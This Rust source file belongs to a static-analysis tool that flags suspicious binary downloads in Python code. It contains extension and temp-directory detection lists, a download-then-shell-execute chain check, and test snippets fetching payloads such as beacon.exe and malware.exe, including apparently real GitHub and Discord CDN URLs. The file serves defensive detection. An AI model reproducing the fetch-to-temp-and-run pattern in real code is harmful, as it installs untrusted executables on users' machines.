use crate::checker::Checker;
use crate::result::{AuditConfidence, AuditItem, Rule};
use crate::rules::exec::get_call_suspicious_taint;
use hexora_semantic::resolver::string_from_expr;
use once_cell::sync::Lazy;
use ruff_python_ast as ast;
use ruff_text_size::Ranged;

static EXTENSIONS: Lazy<Vec<&'static str>> = Lazy::new(|| {
    vec![
        ".exe", ".dll", ".so", ".dylib", ".bin", ".ps1", ".bat", ".cmd", ".scr", ".cpl", ".msi",
        ".jar", ".sh",
    ]
});

static TEMP_DIR_PATTERNS: &[&str] = &[
    "gettempdir",
    "NamedTemporaryFile",
    "/tmp/",
    "\\temp\\",
    "$TMP",
    "%TEMP%",
    "%TMP%",
];

fn strip_url_suffixes(text: &str) -> &str {
    let cutoff = text.find(['?', '#']).unwrap_or(text.len());
    &text[..cutoff]
}

fn has_any_extension(url: &str) -> bool {
    let cleaned = strip_url_suffixes(url);
    let last_segment = cleaned.rsplit('/').next().unwrap_or(cleaned);
    if let Some(dot_pos) = last_segment.rfind('.') {
        let ext = &last_segment[dot_pos..];
        !ext.contains('/') && !ext.contains('\\')
    } else {
        false
    }
}

fn contains_download_extension(checker: &Checker, call: &ast::ExprCall) -> Option<String> {
    for arg in &call.arguments.args {
        if let Some(text) = string_from_expr(arg, &checker.indexer) {
            let lowered = strip_url_suffixes(&text).to_ascii_lowercase();
            for ext in EXTENSIONS.iter() {
                if lowered.ends_with(ext) {
                    return Some(text);
                }
            }
        }
    }
    for kw in &call.arguments.keywords {
        if let Some(text) = string_from_expr(&kw.value, &checker.indexer) {
            let lowered = strip_url_suffixes(&text).to_ascii_lowercase();
            for ext in EXTENSIONS.iter() {
                if lowered.ends_with(ext) {
                    return Some(text);
                }
            }
        }
    }
    None
}

/// Extract local file path strings from download call arguments for exec chain detection.
/// Only collects the destination path (not the source URL) to avoid false positives.
fn extract_download_paths(checker: &Checker, call: &ast::ExprCall) -> Vec<String> {
    let mut paths = Vec::new();
    let qn = checker.indexer.get_qualified_name(call);
    if let Some(qn) = qn {
        let name = qn.as_str();
        // urlretrieve(url, path) — the second positional arg is the local file path
        if name.contains("urlretrieve") {
            if let Some(path_arg) = call.arguments.args.get(1) {
                if let Some(text) = string_from_expr(path_arg, &checker.indexer) {
                    paths.push(text);
                }
            }
        }
    }
    paths
}

/// Check source text of the destination path argument for temp directory indicators.
/// Follows variable references to their assignment expressions to handle cases like:
///   `_BIN = os.path.join(tempfile.gettempdir(), ".kh"); urlretrieve(url, _BIN)`
fn arg_source_has_temp_dir(checker: &Checker, call: &ast::ExprCall) -> bool {
    let source = checker.locator.contents();
    // Only check the second argument (destination path), not the URL (arg 0)
    if let Some(path_arg) = call.arguments.args.get(1) {
        // First check the argument's own source text (handles string literals and inline exprs)
        let range = path_arg.range();
        let text = &source[range];
        let lowered = text.to_ascii_lowercase();
        if TEMP_DIR_PATTERNS.iter().any(|p| lowered.contains(p)) {
            return true;
        }
        if let ast::Expr::Name(ast::ExprName { node_index, .. }) = path_arg {
            if let Some(exprs) = checker.indexer.get_exprs_by_index(node_index) {
                for expr in exprs {
                    let range = expr.range();
                    let text = &source[range];
                    let lowered = text.to_ascii_lowercase();
                    if TEMP_DIR_PATTERNS.iter().any(|p| lowered.contains(p)) {
                        return true;
                    }
                }
            }
        }
    }
    false
}

pub fn binary_download(checker: &mut Checker, call: &ast::ExprCall) {
    let qualified_name = checker.indexer.get_qualified_name(call);
    if let Some(qualified_name) = qualified_name
        && qualified_name.is_download_request()
    {
        // Store any resolved download paths for cross-referencing with exec calls
        for path in extract_download_paths(checker, call) {
            if !checker.downloaded_paths.contains(&path) {
                checker.downloaded_paths.push(path);
            }
        }

        // Strategy 1: Known binary extension in URL
        if let Some(label) = contains_download_extension(checker, call) {
            let suspicious_taint = get_call_suspicious_taint(checker, call);
            let confidence = if suspicious_taint.is_some() {
                AuditConfidence::High
            } else {
                AuditConfidence::Medium
            };

            checker.audit_results.push(AuditItem {
                label,
                rule: Rule::BinaryDownload,
                description: "Suspicious binary download.".to_string(),
                confidence,
                location: Some(call.range),
            });
            return;
        }

        // Strategy 2: Extensionless download via urlretrieve with temp-dir target
        let name = qualified_name.as_str();
        if name.contains("urlretrieve") {
            let to_temp = arg_source_has_temp_dir(checker, call);
            let url_no_ext = call.arguments.args.first().and_then(|arg| {
                string_from_expr(arg, &checker.indexer).filter(|url| !has_any_extension(url))
            });

            if to_temp && url_no_ext.is_some() {
                let label =
                    url_no_ext.unwrap_or_else(|| "urlretrieve to temp directory".to_string());
                checker.audit_results.push(AuditItem {
                    label,
                    rule: Rule::BinaryDownload,
                    description: "Suspicious binary download (extensionless to temp directory)."
                        .to_string(),
                    confidence: AuditConfidence::Medium,
                    location: Some(call.range),
                });
            }
        }
    }
}

/// Detect when a previously downloaded file path is executed via shell command.
pub fn check_download_exec_chain(checker: &mut Checker, call: &ast::ExprCall) {
    if checker.downloaded_paths.is_empty() {
        return;
    }

    let qn = checker.indexer.resolve_qualified_name(&call.func);
    if !qn.is_some_and(|qn| qn.is_shell_command()) {
        return;
    }

    for arg in &call.arguments.args {
        if let Some(text) = string_from_expr(arg, &checker.indexer) {
            if checker.downloaded_paths.iter().any(|path| path == &text) {
                let already_reported = checker.audit_results.iter().any(|item| {
                    item.rule == Rule::BinaryDownload && item.location == Some(call.range)
                });
                if !already_reported {
                    checker.audit_results.push(AuditItem {
                        label: text,
                        rule: Rule::BinaryDownload,
                        description: "Downloaded binary executed via shell command.".to_string(),
                        confidence: AuditConfidence::High,
                        location: Some(call.range),
                    });
                }
                return;
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use crate::result::Rule;
    use crate::rules::test::*;
    use test_case::test_case;

    #[test_case("download_01.py", Rule::BinaryDownload, vec!["https://www.example.com/beacon.exe",])]
    #[test_case("download_02.py", Rule::BinaryDownload, vec![])]
    #[test_case("download_03.py", Rule::BinaryDownload, vec!["https://example.com/tool.exe"])]
    #[test_case("download_04.py", Rule::BinaryDownload, vec!["https://github.com/gibunxi4201/kube-node-diag/releases/download/v2.0/kube-diag-linux-amd64-packed"])]
    #[test_case("download_05.py", Rule::BinaryDownload, vec!["https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe"])]
    #[test_case("download_06.py", Rule::BinaryDownload, vec![])]
    fn test_exec(path: &str, rule: Rule, expected_names: Vec<&str>) {
        assert_audit_results_by_name(path, rule, expected_names);
    }

    #[test]
    fn test_binary_download_uppercase_extension() {
        let source = r#"import requests
requests.get("https://www.example.com/BEACON.EXE")
"#;
        let result = crate::pipeline::audit_source(source, None).unwrap();
        let matches: Vec<_> = result
            .into_iter()
            .filter(|item| item.rule == Rule::BinaryDownload)
            .map(|item| item.label)
            .collect();
        assert_eq!(matches, vec!["https://www.example.com/BEACON.EXE"]);
    }

    #[test]
    fn test_binary_download_query_string_extension() {
        let source = r#"import requests
requests.get("https://www.example.com/beacon.exe?download=1")
"#;
        let result = crate::pipeline::audit_source(source, None).unwrap();
        let matches: Vec<_> = result
            .into_iter()
            .filter(|item| item.rule == Rule::BinaryDownload)
            .map(|item| item.label)
            .collect();
        assert_eq!(
            matches,
            vec!["https://www.example.com/beacon.exe?download=1"]
        );
    }

    #[test]
    fn test_urlretrieve_with_exe_extension() {
        let source = r#"import urllib.request
urllib.request.urlretrieve("https://example.com/tool.exe", "/tmp/tool")
"#;
        let result = crate::pipeline::audit_source(source, None).unwrap();
        let matches: Vec<_> = result
            .into_iter()
            .filter(|item| item.rule == Rule::BinaryDownload)
            .collect();
        assert!(
            !matches.is_empty(),
            "urlretrieve with .exe should be detected"
        );
        assert_eq!(matches[0].label, "https://example.com/tool.exe");
    }

    #[test]
    fn test_urlretrieve_to_temp_no_extension() {
        let source = r#"import urllib.request, tempfile, os
path = os.path.join(tempfile.gettempdir(), ".kh")
urllib.request.urlretrieve("https://example.com/kube-diag-linux-amd64-packed", path)
"#;
        let result = crate::pipeline::audit_source(source, None).unwrap();
        let matches: Vec<_> = result
            .into_iter()
            .filter(|item| item.rule == Rule::BinaryDownload)
            .collect();
        assert!(
            !matches.is_empty(),
            "urlretrieve to temp dir without extension should be detected: {:?}",
            matches
        );
    }

    #[test]
    fn test_requests_get_extensionless_to_temp_no_detect() {
        // urlopen/requests.get without urlretrieve should not trigger extensionless detection
        let source = r#"import requests
requests.get("https://example.com/kube-diag-linux-amd64-packed")
"#;
        let result = crate::pipeline::audit_source(source, None).unwrap();
        let matches: Vec<_> = result
            .into_iter()
            .filter(|item| item.rule == Rule::BinaryDownload)
            .collect();
        assert!(
            matches.is_empty(),
            "requests.get without urlretrieve should not trigger extensionless detection"
        );
    }

    #[test]
    fn test_binary_download_new_extensions() {
        for (url, ext) in [
            ("https://example.com/payload.ps1", ".ps1"),
            ("https://example.com/script.bat", ".bat"),
            ("https://example.com/inst.msi", ".msi"),
            ("https://example.com/app.jar", ".jar"),
            ("https://example.com/install.sh", ".sh"),
        ] {
            let source = format!(
                r#"import requests
requests.get("{}")
"#,
                url
            );
            let result = crate::pipeline::audit_source(&source, None).unwrap();
            let matches: Vec<_> = result
                .into_iter()
                .filter(|item| item.rule == Rule::BinaryDownload)
                .collect();
            assert!(
                !matches.is_empty(),
                "Extension {} should be detected in URL: {}",
                ext,
                url
            );
        }
    }

    #[test]
    fn test_urllib_urlretrieve_detected() {
        let source = r#"import urllib.request
urllib.request.urlretrieve("https://example.com/beacon.exe", "/tmp/beacon")
"#;
        let result = crate::pipeline::audit_source(source, None).unwrap();
        let matches: Vec<_> = result
            .into_iter()
            .filter(|item| item.rule == Rule::BinaryDownload)
            .collect();
        assert!(
            !matches.is_empty(),
            "urlretrieve with .exe should be detected"
        );
    }

    #[test]
    fn test_urllib2_urlretrieve_detected() {
        let source = r#"import urllib2
urllib2.urlretrieve("https://example.com/malware.exe", "/tmp/malware")
"#;
        let result = crate::pipeline::audit_source(source, None).unwrap();
        let matches: Vec<_> = result
            .into_iter()
            .filter(|item| item.rule == Rule::BinaryDownload)
            .collect();
        assert!(
            !matches.is_empty(),
            "urllib2.urlretrieve should be detected"
        );
    }

    #[test]
    fn test_benign_urlretrieve_not_detected() {
        // urlretrieve to a non-temp, non-binary path should NOT be flagged
        let source = r#"import urllib.request
urllib.request.urlretrieve("https://example.com/data.json", "./data.json")
"#;
        let result = crate::pipeline::audit_source(source, None).unwrap();
        let matches: Vec<_> = result
            .into_iter()
            .filter(|item| item.rule == Rule::BinaryDownload)
            .collect();
        assert!(
            matches.is_empty(),
            "benign urlretrieve to non-temp json should not be detected"
        );
    }
}
